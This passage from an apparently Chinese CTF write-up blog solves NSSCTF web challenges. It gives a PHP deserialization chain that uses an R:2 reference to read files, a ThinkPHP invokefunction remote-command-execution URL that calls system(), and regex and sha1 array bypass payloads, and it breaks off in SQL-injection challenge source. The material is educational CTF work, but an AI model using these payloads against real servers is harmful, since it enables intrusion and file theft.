<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5D%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%85%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>就拿到了flag。</p>
<h2 id="第五空间-2021-pklovecloud"><a href="#第五空间-2021-pklovecloud" class="headerlink" title="[第五空间 2021]pklovecloud"></a>[第五空间 2021]pklovecloud</h2><p>先看题目源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">class pkshow </span><br><span class="line">&#123;  </span><br><span class="line">    function echo_name()     </span><br><span class="line">    &#123;          </span><br><span class="line">        return &quot;Pk very safe^.^&quot;;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class acp </span><br><span class="line">&#123;   </span><br><span class="line">    protected $cinder;  </span><br><span class="line">    public $neutron;</span><br><span class="line">    public $nova;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;cinder = new pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if (isset($this-&gt;cinder))  </span><br><span class="line">            return $this-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class ace</span><br><span class="line">&#123;    </span><br><span class="line">    public $filename;     </span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker; </span><br><span class="line">    function echo_name()      </span><br><span class="line">    &#123;   </span><br><span class="line">        $this-&gt;openstack = unserialize($this-&gt;docker);</span><br><span class="line">        $this-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;</span><br><span class="line">            if (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123; </span><br><span class="line">                return &quot;keystone lost~&quot;; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;pks&#x27;]))  </span><br><span class="line">&#123;</span><br><span class="line">    $logData = unserialize($_GET[&#x27;pks&#x27;]);</span><br><span class="line">    echo $logData; </span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(__file__); </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>先来说说链子，敏感函数肯定是怎么触发file_get_content函数</p>
<p>然后要触发echo_name函数，找了找发现acp的to_string里面用到了这个函数，并且使acp的this-&gt;cinder&#x3D;new ace()就可以了</p>
<p>链子构造出来很简单，但是这道题有两个比较难的点：</p>
<p>一个是从未出现过的$heat变量，一个是unserialize($this-&gt;docker)。如何满足$this-&gt;openstack-&gt;neutron &#x3D;&#x3D;&#x3D; $this-&gt;openstack-&gt;nova是这道题的关键。</p>
<h3 id="第一种解法："><a href="#第一种解法：" class="headerlink" title="第一种解法："></a>第一种解法：</h3><p>到这里始终想不到怎么满足这个条件，就去看了wp，官方wp是这样的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cinder = <span class="keyword">new</span> <span class="title function_ invoke__">ace</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;cinder)) </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;cinder-&gt;<span class="title function_ invoke__">echo_name</span>(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;docker = <span class="string">&#x27;O:8:&quot;stdClass&quot;:2:&#123;s:7:&quot;neutron&quot;;s:1:&quot;a&quot;;s:4:&quot;nova&quot;;R:2;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;docker);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;openstack-&gt;neutron === <span class="variable language_">$this</span>-&gt;openstack-&gt;nova) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>)) </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cls</span> = <span class="keyword">new</span> <span class="title function_ invoke__">acp</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cls</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cls</span>;</span><br></pre></td></tr></table></figure>

<p>前面的都不难理解，主要是docker的内容是什么意思呢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;stdClass&quot;:2:&#123;s:7:&quot;neutron&quot;;s:1:&quot;a&quot;;s:4:&quot;nova&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>

<p>根据序列化后的字段进行分析，这个R:2是什么意思？</p>
<p>根据wp的所给验证方法，终于明白了，我们来看看</p>
<p>构造一个类进行验证：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$n</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$o</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$q</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$n</span>,<span class="variable">$o</span>,<span class="variable">$p</span>,<span class="variable">$q</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;m = <span class="variable">$m</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;n = <span class="variable">$n</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;o = <span class="variable">$o</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;q = <span class="variable">$q</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$i0clay</span> = <span class="keyword">new</span> <span class="title class_">Test</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$i0clay</span>-&gt;m = &amp;<span class="variable">$i0clay</span>-&gt;n; <span class="comment">//声明变量m，引用自变量n</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$i0clay</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:5:&#123;s:1:&quot;m&quot;;i:1;s:1:&quot;n&quot;;R:2;s:1:&quot;o&quot;;i:1;s:7:&quot;Testq&quot;;b:1;s:4:&quot;*p&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是这里 R 所处的位置是被引用的变量 n 而非 m。那么 2 这个数字又代表什么呢？受 R 所处位置的启发，尝试更换 m 为其他变量：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$n</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$o</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$q</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$n</span>,<span class="variable">$p</span>,<span class="variable">$q</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;m = <span class="variable">$m</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;n = <span class="variable">$n</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;o = <span class="variable">$o</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;q = <span class="variable">$q</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$i0clay</span> = <span class="keyword">new</span> <span class="title class_">Test</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$i0clay</span>-&gt;o = &amp;<span class="variable">$i0clay</span>-&gt;n;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$i0clay</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:5:&#123;s:1:&quot;m&quot;;i:1;s:1:&quot;n&quot;;i:1;s:1:&quot;o&quot;;R:3;s:7:&quot;Testq&quot;;b:1;s:4:&quot;*p&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>发现R的位置也变了，分析出，R 后的数字代表了要引用其他变量的变量所处的位置。当 m 引用 n 时为 R:2，当 o 引用 n 时 为 R:3。</p>
<p>好的，那么我们就能解释官方wp所给的内容了</p>
<p>为了使两值相等，用R:2指定nova是引用neutron的值，所以在反序列化之后就达到了两值相同的效果</p>
<p>运行exp，跳出空白界面，在F12里得到flag信息：</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5Dpklovecloud%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现flag在提示文件夹下</p>
<p>所以回到poc链那里修改file读取为..&#x2F;nssctfasdasdflag(因为尝试直接读取&#x2F;nssctfasdasdflag失败，不在这个目录下，这里就不做演示了)</p>
<p>正式的wp为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A19%3A%22..%2Fnssctfasdasdflag%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3Bs%3A56%3A%22O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A7%3A%22neutron%22%3Bs%3A1%3A%22a%22%3Bs%3A4%3A%22nova%22%3BR%3A2%3B%7D%22%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>

<p>传入得到flag。</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5Dpklovecloud%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<h3 id="第二种解法："><a href="#第二种解法：" class="headerlink" title="第二种解法："></a>第二种解法：</h3><p>后来觉得这道题有点过于复杂了，所以就又去想了想，发现设置docker变量的值为空也能符合相同的条件</p>
<p>构造payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class acp </span><br><span class="line">&#123;   </span><br><span class="line">    protected $cinder;  </span><br><span class="line">    public $neutron;</span><br><span class="line">    public $nova;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;cinder = new ace;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">class ace</span><br><span class="line">&#123;    </span><br><span class="line">    public $filename=&#x27;flag.php&#x27;;</span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker;</span><br><span class="line">&#125;</span><br><span class="line">$a=new acp();</span><br><span class="line">$b=new ace();</span><br><span class="line">$b-&gt;docker=null;</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这样也能达到一样的效果</p>
<h2 id="SWPUCTF-2022-新生赛-ez-rce"><a href="#SWPUCTF-2022-新生赛-ez-rce" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_rce"></a>[SWPUCTF 2022 新生赛]ez_rce</h2><p>一进去提示不会什么都没有吧，F12也什么都没有，尝试访问常见文件</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现新文件尝试访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>是一个thinkphp的框架题目</p>
<p>直接用工具进行探测：</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.jpg" class>

<p>所测链接直接进行访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>然后挨着挨着查即可</p>
<p>最终payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node3.anna.nssctf.cn:28299//NSS/index.php/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/nss/ctf/flag/flag</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png" class>

<h2 id="鹤城杯-2021-Middle-magic"><a href="#鹤城杯-2021-Middle-magic" class="headerlink" title="[鹤城杯 2021]Middle magic"></a>[鹤城杯 2021]Middle magic</h2><p>题目一进去就是源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;./flag.php&quot;;</span><br><span class="line">include &quot;./result.php&quot;;</span><br><span class="line">if(isset($_GET[&#x27;aaa&#x27;]) &amp;&amp; strlen($_GET[&#x27;aaa&#x27;]) &lt; 20)&#123;</span><br><span class="line"></span><br><span class="line">    $aaa = preg_replace(&#x27;/^(.*)level(.*)$/&#x27;, &#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;, $_GET[&#x27;aaa&#x27;]);</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/pass_the_level_1#/&#x27;, $aaa))&#123;</span><br><span class="line">        echo &quot;here is level 2&quot;;</span><br><span class="line">        </span><br><span class="line">        if (isset($_POST[&#x27;admin&#x27;]) and isset($_POST[&#x27;root_pwd&#x27;])) &#123;</span><br><span class="line">            if ($_POST[&#x27;admin&#x27;] == $_POST[&#x27;root_pwd&#x27;])</span><br><span class="line">                echo &#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;;</span><br><span class="line">        // START FORM PROCESSING    </span><br><span class="line">            else if (sha1($_POST[&#x27;admin&#x27;]) === sha1($_POST[&#x27;root_pwd&#x27;]))&#123;</span><br><span class="line">                echo &quot;here is level 3,do you kown how to overcome it?&quot;;</span><br><span class="line">                if (isset($_POST[&#x27;level_3&#x27;])) &#123;</span><br><span class="line">                    $level_3 = json_decode($_POST[&#x27;level_3&#x27;]);</span><br><span class="line">                    </span><br><span class="line">                    if ($level_3-&gt;result == $result) &#123;</span><br><span class="line">                        </span><br><span class="line">                        echo &quot;success:&quot;.$flag;</span><br><span class="line">                    &#125;</span><br><span class="line">                    else &#123;</span><br><span class="line">                        echo &quot;you never beat me!&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                else&#123;</span><br><span class="line">                    echo &quot;out&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                </span><br><span class="line">                die(&quot;no&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        // perform validations on the form data</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    else&#123;</span><br><span class="line">        echo &#x27;nonono!&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>只有第一个判断条件是第一次见的：</p>
<p>要求内容符合：pass_the_level_1#     但是又不能有^(.<em>)level(.</em>)$，但这种正则匹配规定只在一行，所以用%0a换行，这里后面直接放#始终行不通，上网搜搜才知道在url里的#是位置标识符，所以用%23</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DMiddle%20magic%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>下面的就很熟悉了，使用数组绕过sha1</p>
<p>后面的level_3变量用json格式就行啦</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DMiddle%20magic%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">aaa=%0apass_the_level_1%23</span><br><span class="line">POST</span><br><span class="line">admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:0&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第五空间-2021-yet-another-mysql-injection"><a href="#第五空间-2021-yet-another-mysql-injection" class="headerlink" title="[第五空间 2021]yet_another_mysql_injection"></a>[第五空间 2021]yet_another_mysql_injection</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once(&quot;lib.php&quot;);</span><br><span class="line">function alertMes($mes,$url)&#123;</span><br><span class="line">    die(&quot;&lt;script&gt;alert(&#x27;&#123;$mes&#125;&#x27;);location.href=&#x27;&#123;$url&#125;&#x27;;&lt;/script&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function checkSql($s) &#123;</span><br><span class="line">    if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;,$s))&#123;</span><br><span class="line">        alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;] != &#x27;&#x27; &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; $_POST[&#x27;password&#x27;] != &#x27;&#x27;) &#123;</span><br><span class="line">    $username=$_POST[&#x27;username&#x27;];</span><br><span class="line">    $password=$_POST[&#x27;password&#x27;];</span><br><span class="line">    if ($username !== 